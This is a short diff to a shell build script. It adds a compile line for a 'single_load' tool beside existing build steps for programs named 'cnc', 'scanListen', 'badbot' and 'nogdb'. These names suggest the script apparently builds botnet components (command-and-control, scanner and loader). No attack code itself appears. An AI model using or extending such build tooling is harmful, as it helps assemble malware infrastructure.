@@ -56,6 +56,7 @@ elif [ "$1" == "debug" ]; then
     gcc -std=c99 tools/enc.c -g -o debug/enc
     gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
     gcc -std=c99 tools/badbot.c -g -o debug/badbot
+    gcc -std=c99 tools/single_load.c -g -o debug/single_load -lm -lpthread
     go build -o debug/cnc cnc/*.go
     go build -o debug/scanListen tools/scanListen.go
 else
